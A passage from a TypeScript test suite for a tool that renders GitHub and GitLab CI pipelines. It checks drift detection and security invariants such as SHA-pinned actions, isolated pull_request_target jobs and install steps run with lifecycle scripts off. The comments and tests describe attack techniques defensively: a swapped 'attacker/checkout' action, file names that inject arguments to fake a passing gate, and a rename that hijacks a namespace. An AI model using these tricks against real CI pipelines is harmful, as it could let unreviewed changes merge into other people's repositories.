// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 The Grimoire Authors

// `grim-indexer ci` — the repo-owned, generated pipeline and its drift guard.
//
// Two things are under test and they pull in opposite directions: the files
// are *generated*, so `--check` has to notice a hand-edit; and they are
// *committed to somebody else's repository*, so `--check` must not fail on
// the one edit that repository legitimately owns — the action pin Renovate
// bumps. Most of what follows pins that boundary.
//
// The rest ports the security invariants of the old shipped reusable
// workflows onto the generated output. They stopped being this repo's files
// and became rendered text; nothing about a `pull_request_target` gate got
// safer in the move — and the gate now installs dependencies, which is new
// surface the thin caller never had.
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

import yaml from "js-yaml";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

import {
  GENERATED_HEADER,
  loadCiConfig,
  normalizeForDrift,
  renderCi,
  resolveCi,
  staleCi,
  validateCi,
  type CiConfig,
} from "../../src/ci.js";
import { CliError, EXIT } from "../../src/cli/exit.js";
import { run } from "../../src/cli/main.js";
import { resolveOutDir } from "../../src/cli/out_dir.js";
import { SiteConfigError } from "../../src/config.js";

const PAGES = ".github/workflows/pages.yml";
const VALIDATE = ".github/workflows/validate.yml";
const VERIFY = ".github/workflows/verify-ci.yml";
const GITLAB = ".gitlab-ci.yml";
const GITHUB_FILES = [PAGES, VALIDATE, VERIFY];
const ALL_FILES = [...GITHUB_FILES, GITLAB];
const FORGES = ["github", "gitlab"] as const;

let dir: string;
let errors: string[];
let logs: string[];
let stdout: string[];

function read(rel: string, root = dir): string {
  return fs.readFileSync(path.join(root, rel), "utf8");
}

function exists(rel: string, root = dir): boolean {
  return fs.existsSync(path.join(root, rel));
}

/** What the forge under test actually rendered — the other forge's file is absent. */
function renderedFiles(root: string): string[] {
  return ALL_FILES.filter((file) => exists(file, root));
}

/** Rewrite a generated file in place — the hand-edit each drift test makes. */
function edit(rel: string, fn: (text: string) => string): void {
  const abs = path.join(dir, rel);
  const before = fs.readFileSync(abs, "utf8");
  const after = fn(before);
  expect(after, `${rel}: the edit under test changed nothing`).not.toBe(before);
  fs.writeFileSync(abs, after);
}

function writeFile(rel: string, content: string): void {
  const abs = path.join(dir, rel);
  fs.mkdirSync(path.dirname(abs), { recursive: true });
  fs.writeFileSync(abs, content);
}

/** Walk a parsed YAML document by key path. Array indices are keys too. */
function dig(root: unknown, ...keys: string[]): unknown {
  return keys.reduce<unknown>(
    (node, key) => (node as Record<string, unknown> | undefined)?.[key],
    root,
  );
}

/** Every `run:` script in a parsed GitHub workflow, whatever job it belongs to. */
function runScripts(workflow: unknown): string[] {
  const jobs = (dig(workflow, "jobs") ?? {}) as Record<string, { steps?: Array<{ run?: string }> }>;
  return Object.values(jobs)
    .flatMap((job) => job.steps ?? [])
    .map((step) => step.run ?? "");
}

/** Every shell line of a GitLab job, setup and script alike. */
function jobLines(gitlab: unknown, jobKey: string): string[] {
  const job = dig(gitlab, jobKey) as { before_script?: string[]; script?: string[] } | undefined;
  return [...(job?.before_script ?? []), ...(job?.script ?? [])];
}

/** Every shell line of every GitLab job — `default:` and `stages:` are not jobs. */
function allGitlabLines(gitlab: unknown): string[] {
  return Object.entries(gitlab as Record<string, unknown>).flatMap(([key, value]) =>
    value !== null && typeof value === "object" ? jobLines(gitlab, key) : [],
  );
}

/** Every shell line CI runs for one forge, whatever file or job it lives in. */
function shellLines(root: string, forge: (typeof FORGES)[number]): string[] {
  return forge === "github"
    ? renderedFiles(root).flatMap((file) => runScripts(yaml.load(read(file, root))))
    : allGitlabLines(yaml.load(read(GITLAB, root)));
}

/** Write the `ci` block into `index.config.json`, then render from it. */
async function renderInto(ci: CiConfig, root = dir): Promise<number> {
  fs.mkdirSync(root, { recursive: true });
  fs.writeFileSync(path.join(root, "index.config.json"), JSON.stringify({ ci }, null, 2) + "\n");
  return run(["node", "grim-indexer", "ci", root]);
}

/** A fresh subdir rendered for one forge — the two are mutually exclusive now. */
async function forgeDir(ci: CiConfig, label = ci.forge): Promise<string> {
  const root = path.join(dir, label as string);
  expect(await renderInto(ci, root), label).toBe(0);
  return root;
}

function check(root = dir): Promise<number> {
  return run(["node", "grim-indexer", "ci", root, "--check"]);
}

/** Re-render in write mode over whatever is on disk. */
function write(root = dir): Promise<number> {
  logs = [];
  return run(["node", "grim-indexer", "ci", root]);
}

/** What write mode reported for each path: `written`, `unchanged`, `stale`. */
function reported(): Map<string, string> {
  return new Map(
    logs.map((line) => {
      const [status = "", file = ""] = line.trim().split(/\s+/);
      return [file, status];
    }),
  );
}

beforeEach(() => {
  dir = fs.mkdtempSync(path.join(os.tmpdir(), "index-ci-"));
  errors = [];
  logs = [];
  stdout = [];
  // `ci` reports one `<status> <path>` line per file through console.log, and
  // the status is the assertion in the write-mode tests below.
  vi.spyOn(console, "log").mockImplementation((...args: unknown[]) => {
    logs.push(args.map(String).join(" "));
  });
  vi.spyOn(console, "error").mockImplementation((...args: unknown[]) => {
    errors.push(args.map(String).join(" "));
  });
  // Commander writes help straight to the stream, past console.
  vi.spyOn(process.stdout, "write").mockImplementation((chunk: unknown) => {
    stdout.push(String(chunk));
    return true;
  });
});

afterEach(() => {
  vi.restoreAllMocks();
  fs.rmSync(dir, { recursive: true, force: true });
});

describe("ci", () => {
  // One repository is hosted on one forge. Rendering both left every index
  // with a pipeline it would never run, and a second contribution gate to
  // keep honest for nothing — so the other forge's file must not appear.
  it("renders exactly the file set its forge asks for", async () => {
    for (const [forge, expected] of [
      ["github", GITHUB_FILES],
      ["gitlab", [GITLAB]],
    ] as const) {
      const root = await forgeDir({ forge });

      for (const file of ALL_FILES) {
        expect(exists(file, root), `${forge}: ${file}`).toBe(expected.includes(file));
      }
    }
  });

  it("renders parseable YAML on both forges", async () => {
    for (const forge of FORGES) {
      const root = await forgeDir({ forge });

      for (const file of renderedFiles(root)) {
        // `yaml.load` throws on a multi-document stream, so this also pins
        // that every file is exactly one document.
        expect(() => yaml.load(read(file, root)), file).not.toThrow();
        expect(yaml.load(read(file, root)), file).toBeTypeOf("object");
      }
    }
  });

  // Stale detection keys on this line and nothing else, so a file that lost
  // it would stop being recognised as ours. It carries no version stamp on
  // purpose: the version that renders these files is the one in the repo's
  // `package-lock.json`, and a second copy here would red the drift guard on
  // every dependency bump, over files whose content had not changed.
  it("stamps every rendered file with a version-free header", async () => {
    for (const forge of FORGES) {
      const root = await forgeDir({ forge });

      for (const file of renderedFiles(root)) {
        const text = read(file, root);
        expect(text.startsWith(GENERATED_HEADER), file).toBe(true);
        expect(text.split("\n")[0], `${file}: no version stamp`).not.toMatch(/\d+\.\d+/);
      }
    }
  });

  // The scaffold is a real npm project now: `package.json` plus a committed
  // `package-lock.json` decide which renderer runs, and CI installs that lock.
  // A surviving `npx --yes "@grimoire-rs/indexer@X"` would resolve on the
  // runner instead — an unreviewed version, and a second place to bump.
  it("runs the locked renderer, never a floating npx", async () => {
    for (const forge of FORGES) {
      const root = await forgeDir({ forge });

      for (const file of renderedFiles(root)) {
        const text = read(file, root);
        expect(text, `${file}: nothing fetches a package at run time`).not.toContain("npx");
        expect(text, `${file}: no version pinned by hand`).not.toMatch(/@grimoire-rs\/indexer@/);
        expect(text, `${file}: runs the repo's own scripts`).toMatch(/npm (ci|run) /);
      }
    }
  });

  // No `index.config.json` at all is the state of a repo that predates the
  // `ci` block, and `loadCiConfig` swallows ENOENT so it renders the default.
  it("renders the github default when there is no config to read", async () => {
    expect(await run(["node", "grim-indexer", "ci", dir])).toBe(0);

    expect(exists(PAGES)).toBe(true);
    expect(exists(GITLAB)).toBe(false);
  });
});

describe("ci --check", () => {
  it("passes on a tree it just rendered", async () => {
    await renderInto({ forge: "github" });

    expect(await check()).toBe(0);
    expect(errors).toEqual([]);
  });

  it("exits 65 and names the drifted path on a hand-edit", async () => {
    await renderInto({ forge: "github" });
    edit(PAGES, (t) => t + "\n# my own words\n");

    expect(await check()).toBe(65);
    expect(errors.join("\n")).toContain(`drift: ${PAGES}`);
  });

  // A deleted workflow is drift, not absence: the guard's whole job is that
  // what CI runs matches the config, and a missing file runs nothing.
  it("counts a missing generated file as drift", async () => {
    await renderInto({ forge: "github" });
    fs.rmSync(path.join(dir, VERIFY));

    expect(await check()).toBe(65);
    expect(errors.join("\n")).toContain(`drift: ${VERIFY}`);
  });

  // The index repository owns its own action pins — its Renovate bumps them,
  // and if that tripped the guard every index would red on the next action
  // release, with a "fix" that re-renders the pin straight back down.
  it("tolerates a bumped action pin", async () => {
    await renderInto({ forge: "github" });
    edit(PAGES, (t) =>
      t.replace(
        /actions\/checkout@[0-9a-f]{40}(?: # \S+)?/,
        `actions/checkout@${"1".repeat(40)} # v99.0.0`,
      ),
    );

    expect(await check()).toBe(0);
  });

  // …but only the pin. Swapping the action itself is how a hand-edit would
  // hide, and it is exactly what the pin tolerance must not cover.
  it("trips on a swapped action, not just a swapped ref", async () => {
    await renderInto({ forge: "github" });
    edit(PAGES, (t) => t.replace("actions/checkout@", "attacker/checkout@"));

    expect(await check()).toBe(65);
  });

  it("trips on a changed line beside the pin", async () => {
    await renderInto({ forge: "github" });
    // The line that keeps a token out of the tree a contributor controls.
    edit(PAGES, (t) => t.replace("persist-credentials: false", "persist-credentials: true"));

    expect(await check()).toBe(65);
  });

  it("reports a file the config no longer renders as stale", async () => {
    await renderInto({ forge: "gitlab" });
    await renderInto({ forge: "github" });

    expect(await check()).toBe(65);
    expect(errors.join("\n")).toContain(`stale: ${GITLAB}`);
  });

  // Git for Windows installs with `core.autocrlf=true`, so an untouched clone
  // has CRLF on disk while the renderer emits LF. Every generated file read as
  // drift, and `npm run ci` could not clear it because the rewrite was LF too
  // — a Windows contributor could not get a green pipeline at all. The
  // scaffold's `.gitattributes` prevents it; this unsticks the clones that
  // already have it.
  it("passes on a checkout that git rewrote to CRLF", async () => {
    await renderInto({ forge: "github" });
    for (const file of GITHUB_FILES) {
      edit(file, (t) => t.replace(/\n/g, "\r\n"));
    }

    expect(await check()).toBe(0);
    expect(errors).toEqual([]);
  });
});

// Write mode and check mode judge the same file through the same lens. Where
// they disagreed, the repository lost: `--check` deliberately tolerates a
// bumped `uses: owner/action@<ref>`, while a plain `npm run ci` rewrote it
// back to the pin baked into this package — silently undoing every Renovate
// bump the guard had just told the repository it was allowed to make.
describe("ci (write mode)", () => {
  const BUMPED = "1".repeat(40);

  it("leaves a bumped action pin alone instead of rolling it back", async () => {
    await renderInto({ forge: "github" });
    edit(PAGES, (t) =>
      t.replace(
        /actions\/checkout@[0-9a-f]{40}(?: # \S+)?/,
        `actions/checkout@${BUMPED} # v99.0.0`,
      ),
    );

    expect(await write()).toBe(0);

    expect(read(PAGES), "the repository owns its own pins").toContain(
      `actions/checkout@${BUMPED}`,
    );
    expect(reported().get(PAGES), "and a render that changes nothing says so").toBe("unchanged");
  });

  // Same lens, the other direction: a hand-edit that is not a pin is still
  // rewritten, so `npm run ci` remains the fix a drift report tells you to run.
  it("still rewrites a hand-edit that is not a pin", async () => {
    await renderInto({ forge: "github" });
    edit(PAGES, (t) => t.replace("persist-credentials: false", "persist-credentials: true"));

    expect(await write()).toBe(0);

    expect(read(PAGES)).toContain("persist-credentials: false");
    expect(reported().get(PAGES)).toBe("written");
  });
});

describe("normalizeForDrift", () => {
  const pin = (owner: string, sha: string, comment = " # v7.0.1") =>
    `      - uses: ${owner}@${sha}${comment}\n`;

  it("erases the ref and its version comment, never the action", () => {
    const rolled = normalizeForDrift(pin("actions/checkout", "b".repeat(40), " # v8.0.0"));

    expect(rolled).toBe(normalizeForDrift(pin("actions/checkout", "a".repeat(40))));
    expect(rolled).toContain("uses: actions/checkout");
    expect(rolled).not.toBe(normalizeForDrift(pin("attacker/checkout", "a".repeat(40))));
  });

  // Line endings are not content. A clone under `core.autocrlf=true` differs
  // from the renderer's output in every single line, so without this the guard
  // reported every generated file as drift on Windows.
  it("folds CRLF, and only the line endings", () => {
    expect(normalizeForDrift("name: pages\r\non:\r\n  push: {}\r\n")).toBe(
      normalizeForDrift("name: pages\non:\n  push: {}\n"),
    );
    expect(normalizeForDrift("a\r\nb\r\n")).toBe("a\nb\n");
    // A lone CR is not a line ending git ever writes, and treating it as one
    // would let a hand-edit hide behind it.
    expect(normalizeForDrift("a\rb")).toBe("a\rb");
  });

  // Only an action ref is the repository's to bump. Normalising any other
  // `@` away would let a hand-edit hide inside a `run:` step or a comment.
  it("leaves an `@` that is not an action ref alone", () => {
    const step = `      - run: npm i @grimoire-rs/indexer@9.9.9\n`;
    const prose = "# Renovate may bump `uses: owner/action@<ref>` freely.\n";

    expect(normalizeForDrift(step)).toBe(step);
    expect(normalizeForDrift(prose)).toBe(prose);
  });
});

describe("stale detection", () => {
  const rendered = (ci: CiConfig) => renderCi(resolveCi(ci));

  it("reports what a switched forge stopped rendering", async () => {
    await renderInto({ forge: "gitlab" });

    expect(await staleCi(dir, rendered({ forge: "github" }))).toEqual([GITLAB]);
  });

  it("reports the guard that allowManualEdits stopped rendering", async () => {
    await renderInto({ forge: "github" });

    expect(await staleCi(dir, rendered({ forge: "github", allowManualEdits: true }))).toEqual([
      VERIFY,
    ]);
  });

  // The repository's own workflows share `.github/workflows/` with ours.
  // Reporting one of them stale would invite deleting a file this tool never
  // wrote — hence the header check rather than a name list.
  it("leaves a hand-authored workflow alone", async () => {
    await renderInto({ forge: "github" });
    writeFile(".github/workflows/mine.yml", "name: mine\non:\n  push: {}\n");
    writeFile(".github/workflows/notes.txt", GENERATED_HEADER + " but not a workflow\n");

    expect(await staleCi(dir, rendered({ forge: "github" }))).toEqual([]);
  });

  it("never deletes what it reports", async () => {
    await renderInto({ forge: "gitlab" });
    await renderInto({ forge: "github" });

    expect(exists(GITLAB)).toBe(true);
  });

  // CI scaffolded by a pre-header release (<= 0.2.2) was a thin caller into
  // this package's reusable workflow, or a GitLab remote include of the same.
  // Those files carry no generated header, so a reaper that keyed on the
  // header alone was blind to exactly the repositories that most need telling:
  // an index scaffolded with the old `--forge both` resolves to `github` today
  // (its config has no `ci` block at all) and would keep serving an orphaned
  // `.gitlab-ci.yml` with nothing to say so.
  it("reports a pre-header scaffold the config no longer renders", async () => {
    await renderInto({ forge: "github" });
    writeFile(
      ".github/workflows/index-pages.yml",
      "name: pages\non:\n  push:\n    branches: [main]\njobs:\n  pages:\n" +
        "    uses: grimoire-rs/indexer/.github/workflows/index-pages.yml@v0.2.2\n",
    );
    writeFile(
      GITLAB,
      "include:\n  - remote: https://raw.githubusercontent.com/grimoire-rs/indexer/" +
        "v0.2.2/templates/reusable/gitlab-index-ci.yml\n",
    );
    // Neither signature, so it is the repository's own file and none of this
    // tool's business — the discrimination the header check exists for.
    writeFile(".github/workflows/mine.yml", "name: mine\non:\n  push: {}\n");

    expect(await staleCi(dir, rendered({ forge: "github" }))).toEqual([
      ".github/workflows/index-pages.yml",
      GITLAB,
    ]);
  });
});

describe("enrich", () => {
  // `build` compiles `enrich/` into `all.json`, so enriching after it would
  // produce sidecars nothing ever reads — a site that silently stays on
  // "No README available" with a green pipeline. Order is the contract.
  it("enriches before it builds, non-fatally, on github", async () => {
    const root = await forgeDir({ forge: "github" });
    const steps = (
      yaml.load(read(PAGES, root)) as { jobs: { build: { steps: Array<{ run?: string }> } } }
    ).jobs.build.steps;
    const runs = steps.map((step) => step.run ?? "");
    const enrichAt = runs.findIndex((r) => /npm run enrich/.test(r));
    const buildAt = runs.findIndex((r) => /npm run build/.test(r));

    expect(enrichAt, "the pages workflow enriches").toBeGreaterThanOrEqual(0);
    expect(enrichAt).toBeLessThan(buildAt);
    // grim is what reads the registry; enriching without it is the failure
    // this whole step exists to avoid. Matched against the whole step, not
    // its `run:` — the release URL is resolved at render time and lands in
    // `env:`, so a run-only haystack would go green on an absent install.
    expect(JSON.stringify(steps.slice(0, enrichAt))).toMatch(/releases\/[\s\S]*grimoire-/);
    // A registry outage degrades the site to pointers; it must never block
    // a deploy that is otherwise ready.
    expect(runs[enrichAt]).toMatch(/\|\|/);
  });

  it("enriches before it builds, non-fatally, on gitlab", async () => {
    const root = await forgeDir({ forge: "gitlab" });
    const script = jobLines(yaml.load(read(GITLAB, root)), "pages").join("\n");
    const enrichAt = script.search(/npm run enrich/);
    const buildAt = script.search(/npm run build/);

    expect(enrichAt, "the gitlab pages job enriches").toBeGreaterThanOrEqual(0);
    expect(enrichAt).toBeLessThan(buildAt);
    expect(script.slice(0, enrichAt)).toMatch(/releases\/[\s\S]*grimoire-/);
    expect(script).toMatch(/\|\|\s*echo/);
  });

  // `enrich: false` is a pointers-only site whose build never leaves the
  // runner. A leftover step would drag grim, curl and a network round trip
  // back into a pipeline that opted out of all three.
  it("renders enrichment away entirely on both forges", async () => {
    for (const forge of FORGES) {
      const root = await forgeDir({ forge, enrich: false }, `no-enrich-${forge}`);

      for (const file of renderedFiles(root)) {
        expect(read(file, root), file).not.toContain("enrich");
      }
      // …and the file is still a pipeline, not a hole where one used to be.
      const built =
        forge === "github"
          ? dig(yaml.load(read(PAGES, root)), "jobs", "build", "steps")
          : dig(yaml.load(read(GITLAB, root)), "pages", "script");
      expect(built, forge).toBeTruthy();
    }
  });
});

describe("allowManualEdits", () => {
  it("emits the drift guard on both forges by default", async () => {
    expect(exists(VERIFY, await forgeDir({ forge: "github" }))).toBe(true);

    const gitlab = yaml.load(read(GITLAB, await forgeDir({ forge: "gitlab" })));
    expect(dig(gitlab, "grim-indexer:verify-ci")).toBeTruthy();
  });

  it("emits no guard at all when the repo owns its CI by hand", async () => {
    const github = await forgeDir({ forge: "github", allowManualEdits: true }, "manual-github");
    const gitlabRoot = await forgeDir({ forge: "gitlab", allowManualEdits: true }, "manual-gitlab");
    const gitlab = yaml.load(read(GITLAB, gitlabRoot));

    expect(exists(VERIFY, github)).toBe(false);
    expect(dig(gitlab, "grim-indexer:verify-ci")).toBeUndefined();
    // The rest of the pipeline is untouched — opting out of the guard is not
    // opting out of CI.
    expect(exists(PAGES, github)).toBe(true);
    expect(dig(gitlab, "pages")).toBeTruthy();
  });
});

// The gate decides; this decides what happens to a pull request the gate
// passed. Everything here is about the seam between the two — a merge that
// acts on a verdict about a different commit is the same failure as no gate.
describe("autoMerge", () => {
  const automerge = (root: string) => dig(yaml.load(read(VALIDATE, root)), "jobs", "automerge");

  it("merges nothing unless the index asked for it", async () => {
    expect(automerge(await forgeDir({ forge: "github" }, "no-automerge"))).toBeUndefined();
  });

  it("gates the merge on the gate, and on the commit the gate judged", async () => {
    const root = await forgeDir({ forge: "github", autoMerge: true }, "automerge");
    const job = automerge(root) as { needs?: string; permissions?: Record<string, string> };
    const script = ((job as { steps: Array<{ run?: string }> }).steps[0]?.run ?? "").split("\n");
    const merge = script.find((line) => line.includes("gh pr merge")) ?? "";

    // `needs:` IS the authorization — the gate's exit code reaches this job
    // as "did it run at all", and a cancelled or skipped gate stops here too.
    expect(job.needs).toBe("validate");
    // Without this the gate judges one head and the merge takes whatever is
    // current, so a push landing between the two jobs is what lands on main.
    expect(merge).toContain("--match-head-commit");
    // The write token must never share a runner with contributor content.
    expect(JSON.stringify(job)).not.toContain("actions/checkout");
  });

  // The gate reads the pull request; only this job may write. Sharing one
  // job's permissions across both would hand `contents: write` to the step
  // that has the untrusted tree on disk.
  it("keeps the write token out of the job that reads the contribution", async () => {
    const root = await forgeDir({ forge: "github", autoMerge: true }, "automerge-perms");
    const jobs = dig(yaml.load(read(VALIDATE, root)), "jobs") as Record<
      string,
      { permissions: Record<string, string> }
    >;

    expect(jobs.validate.permissions).toEqual({ "contents": "read", "pull-requests": "read" });
    expect(jobs.automerge.permissions.contents).toBe("write");
  });

  // A push made with GITHUB_TOKEN triggers no workflow, so a merge this job
  // makes never builds the site unless it says so.
  it("dispatches the deploy the merge itself cannot trigger", async () => {
    const root = await forgeDir({ forge: "github", autoMerge: true }, "automerge-deploy");
    const script = JSON.stringify(automerge(root));

    expect(script).toContain("gh workflow run pages.yml");
    expect(exists(PAGES, root), "the workflow it dispatches is one this index has").toBe(true);
  });

  it("renders identically on every run, with and without the job", async () => {
    for (const ci of [{ forge: "github" as const }, { forge: "github" as const, autoMerge: true }]) {
      const files = renderCi(resolveCi(ci));

      expect(renderCi(resolveCi(ci)), JSON.stringify(ci)).toEqual(files);
      // An optional block that renders empty at the end of a file used to
      // leave its own blank line behind, so one config had two shapes.
      for (const [name, content] of files) {
        expect(content, name).toMatch(/[^\n]\n$/);
      }
    }
  });
});

// Ported from the reusable workflows these replaced. The files moved into
// the index repository; the trust boundary did not move with them.
describe("generated GitHub workflows", () => {
  beforeEach(async () => {
    await renderInto({ forge: "github" });
  });

  it("keeps permissions default-deny at the top and elevates per job", () => {
    for (const file of GITHUB_FILES) {
      const workflow = yaml.load(read(file));

      expect(dig(workflow, "permissions"), file).toEqual({});
      const jobs = dig(workflow, "jobs") as Record<string, Record<string, unknown>>;
      expect(Object.keys(jobs).length, file).toBeGreaterThan(0);
      for (const [name, job] of Object.entries(jobs)) {
        expect(job.permissions, `${file}: ${name} pays for its own permissions`).toBeTruthy();
      }
    }
  });

  it("SHA-pins every action", () => {
    for (const file of GITHUB_FILES) {
      const text = read(file);
      // Line-anchored: the generated header discusses `uses:` in prose, and a
      // regex that matched the comment would fail on the documentation.
      const uses = [...text.matchAll(/^\s*-?\s*uses: (\S+)/gm)].map((m) => m[1] as string);

      expect(uses.length, file).toBeGreaterThan(0);
      for (const ref of uses) {
        expect(ref, `${file}: ${ref}`).toMatch(/@[0-9a-f]{40}$/);
      }
    }
  });

  // `pull_request_target` runs with a write-capable token against the base
  // repo. It is safe here for exactly one reason: nothing in the
  // contributor's tree is ever executed. The gate installs dependencies now,
  // which is precisely how that would start happening by accident — an
  // install run from `pr-tree/` resolves the contributor's own lockfile.
  it("judges the pull request without executing any of it", () => {
    const workflow = yaml.load(read(VALIDATE)) as { on: Record<string, unknown> };

    expect(workflow.on.pull_request_target).toBeTruthy();

    const scripts = runScripts(workflow);
    expect(
      scripts.some((script) => script.length > 0),
      "the gate does run something",
    ).toBe(true);

    for (const script of scripts) {
      // The path may be handed to the trusted renderer as an argument. Any
      // other mention would be the shell reaching into the untrusted tree —
      // an install, a `cd`, a source, a read.
      expect(script.replace(/--pr-tree \S+/g, ""), "no run: step touches pr-tree").not.toContain(
        "pr-tree",
      );
    }
  });

  // The lock these jobs install is the maintainer-committed one in the base
  // checkout, reviewed like any other file here. `--ignore-scripts` holds the
  // line one step further: no job needs anything a dependency lifecycle script
  // provides, and a lifecycle script is arbitrary code either way.
  //
  // `pages` is NOT exempt, and used to be. It runs on the default branch — but
  // the default branch is where auto-merged contributions land, so a `prepare`
  // script or a lock entry that arrived through the gate would execute in the
  // one job that holds the deploy token.
  it("installs with lifecycle scripts off in every job, pages included", () => {
    for (const file of GITHUB_FILES) {
      const installs = runScripts(yaml.load(read(file))).filter((script) =>
        /npm ci\b/.test(script),
      );

      expect(installs.length, `${file} installs its dependencies`).toBeGreaterThan(0);
      for (const install of installs) {
        expect(install, `${file}: ${install}`).toContain("--ignore-scripts");
      }
    }
  });

  // The lock decides which renderer produces these files, so a change to it
  // has to re-run the guard — otherwise a dependency bump that moves the
  // rendered output lands green and the next unrelated pull request wears it.
  it("re-runs the guard when the config, the manifest or the lock changes", () => {
    const workflow = yaml.load(read(VERIFY));

    for (const event of ["pull_request", "push"]) {
      expect(dig(workflow, "on", event, "paths"), event).toEqual(
        expect.arrayContaining([
          "index.config.json",
          "package.json",
          "package-lock.json",
          ".github/workflows/**",
        ]),
      );
    }
  });

  // The gate's exit code authorizes an auto-merge, so anything filtered out
  // of the changed-path list is filtered out of that decision. Narrowing to
  // `^index/` lets a pull request that adds a valid entry and edits a
  // workflow pass; dropping `removed` lets one that adds its own entry and
  // deletes a stranger's pass.
  it("hands the gate every changed path, unfiltered", () => {
    const workflow = yaml.load(read(VALIDATE)) as {
      jobs: Record<string, { steps?: Array<{ name?: string; run?: string }> }>;
    };
    const steps = Object.values(workflow.jobs).flatMap((job) => job.steps ?? []);
    const collect = steps.find((step) => step.name === "Collect changed paths")?.run ?? "";

    expect(collect, "the gate collects changed paths").toContain("changed.txt");
    expect(collect, "no path filter").not.toMatch(/grep[^\n]*index/);
    expect(collect, "no status filter").not.toContain("removed");
  });

  // The scaffold told users to require the status check `validate`. As a thin
  // caller it reported `<caller job> / <called job>` instead, so that context
  // never reported and a passing gate sat at BLOCKED forever —
  // indistinguishable from the gate rejecting the contribution. Now the job
  // key IS the context, so renaming the job must move the documented name too.
  it("names the status check branch protection has to require", () => {
    const text = read(VALIDATE);
    const jobKey = Object.keys(dig(yaml.load(text), "jobs") as object)[0] as string;

    expect(text, `branch protection must be told to require \`${jobKey}\``).toContain(
      `\`${jobKey}\``,
    );
    expect(text, "no longer a thin caller — the two-part context never reports").not.toContain(
      `${jobKey} / `,
    );
  });
});

describe("generated GitLab CI", () => {
  beforeEach(async () => {
    await renderInto({ forge: "gitlab" });
  });

  it("is one document with the stages and the artifact Pages serves", () => {
    const gitlab = yaml.load(read(GITLAB));

    expect(dig(gitlab, "stages")).toEqual(["test", "deploy"]);
    expect(dig(gitlab, "pages", "artifacts", "paths")).toEqual(["public"]);
  });

  it("hands the gate every changed path, unfiltered", () => {
    const diff = jobLines(yaml.load(read(GITLAB)), "grim-indexer:validate")
      .join("\n")
      .split("\n")
      .find((line) => line.includes("git diff"));

    expect(diff, "the gate diffs the merge request").toBeDefined();
    expect(diff, "no pathspec").not.toMatch(/--\s+index\b/);
    expect(diff, "no diff filter").not.toContain("--diff-filter");
  });

  // The gate ran `git` on `node:*-alpine`, which ships none: every merge
  // request died with `git: not found`, exit 127, before validating anything.
  // And a *silently* absent tool is worse than a loud one — the gate's
  // contract is "exit 0 = eligible for auto-merge", so a failed install has
  // to fail the job rather than skip validation.
  it("makes git available before it runs git, and fails when it cannot", () => {
    const gitlab = yaml.load(read(GITLAB)) as Record<string, { script?: string[] }>;
    const setup = (
      dig(gitlab, "grim-indexer:validate", "before_script") as string[] | undefined
    )?.join("\n");

    expect(gitlab["grim-indexer:validate"]?.script?.join("\n"), "the gate diffs with git").toMatch(
      /\bgit\s+\w/,
    );
    expect(setup ?? "", "…so something must install it first").toMatch(/\bgit\b/);
    expect(setup ?? "", "and a failed install must fail the job").toMatch(
      /command -v git[\s\S]*exit 1/,
    );
  });

  // GitLab has no base-branch copy of the pipeline — the merge request brings
  // its own `.gitlab-ci.yml` and its own checkout — so the lock these jobs
  // install is the contributor's. A lifecycle script from it would run as CI
  // before a single line of the contribution had been judged.
  it("installs with lifecycle scripts off in every job, pages included", () => {
    const gitlab = yaml.load(read(GITLAB));

    for (const jobKey of ["grim-indexer:validate", "grim-indexer:verify-ci", "pages"]) {
      const installs = jobLines(gitlab, jobKey).filter((line) => /npm ci\b/.test(line));

      expect(installs.length, `${jobKey} installs its dependencies`).toBeGreaterThan(0);
      for (const install of installs) {
        expect(install, `${jobKey}: ${install}`).toContain("--ignore-scripts");
      }
    }
  });
});

// The CLI's own guard is the second line of defence; this is the first, and it
// is the one that matters, because a repository that wires the gate itself
// gets no CLI guard until it upgrades. A changed path is an attacker-authored
// string: CI used to append the whole list to argv with `xargs`, so a pull
// request adding an empty file named `-h` made commander print help and
// short-circuit with exit 0 — which this job's contract reads as "eligible for
// auto-merge" — and one spelled `--policy=pr-tree/index-policy.json` pointed
// the committed allowlist at a file inside the contribution.
describe("the changed-path list never reaches a command line", () => {
  it("puts no changed path on argv, on either forge", async () => {
    for (const forge of FORGES) {
      const root = await forgeDir({ forge }, `argv-${forge}`);

      for (const line of shellLines(root, forge)) {
        // The one construct that put the list on argv. The prose above the
        // step says not to reintroduce it, which is why this reads the shell
        // rather than the file.
        expect(line, `${forge}: xargs is how the paths reached argv`).not.toContain("xargs");
      }
      // The gate is invoked with the list in a FILE and no path argument.
      const invocation = shellLines(root, forge)
        .join("\n")
        .split("\n")
        .filter((line) => line.includes("--forge") || line.includes("--changed-from"))
        .join(" ");
      expect(invocation, `${forge}: the gate reads the list from a file`).toContain(
        "--changed-from",
      );
      expect(invocation, `${forge}: and takes no path argument`).not.toMatch(/\sindex\//);
    }
  });

  // Pagination is the same argument in a different shape: `pulls/{n}/files`
  // stops at 3000 files, so without the cross-check a large enough pull
  // request pushes its interesting paths past the cap and the gate authorizes
  // a change it never saw.
  it("cross-checks the collected count against the pull request's own", async () => {
    const root = await forgeDir({ forge: "github" }, "count-github");
    const workflow = yaml.load(read(VALIDATE, root)) as {
      jobs: Record<string, { steps?: Array<{ name?: string; run?: string }> }>;
    };
    const collect =
      Object.values(workflow.jobs)
        .flatMap((job) => job.steps ?? [])
        .find((step) => step.name === "Collect changed paths")?.run ?? "";

    expect(collect, "the count the API declares").toContain("changed_files");
    expect(collect, "compared against what was collected").toMatch(/-ne/);
    expect(collect, "and a short list fails the job").toMatch(/exit 1/);
    // Records, not lines. A path may legally contain a newline, and a rename
    // contributes two lines from one record — either would make `wc -l` on
    // the collected list disagree with `changed_files` for innocent reasons,
    // or agree while a path was dropped past the 3000 cap.
    expect(collect, "counts API records rather than lines").toMatch(/jq 'length'/);
    expect(collect, "never counts the collected list itself").not.toMatch(/wc -l < changed/);
    // …and counts the same snapshot it hands the gate. Three separate fetches
    // of a mutable resource let a push land between them, so the count
    // described one head while the path list described another.
    expect(collect, "one fetch, then every derivation from it").toMatch(
      /gh api --paginate[^\n]*\|[^\n]*jq -s 'add'/,
    );
  });

  // A hijack is a rename: copy the victim's metadata.json into your own
  // namespace, swap `owner` and `ref`, delete the original. Git and the GitHub
  // API both report that as ONE path — the destination — so the deletion never
  // reached the gate and no ownership check ever ran on the victim's
  // namespace. Reproduced end to end before the fix: exit 0, eligible.
  // Asserted against the COMMAND, not the surrounding block: the comment
  // above each command explains the flag by name, so a block-wide `toContain`
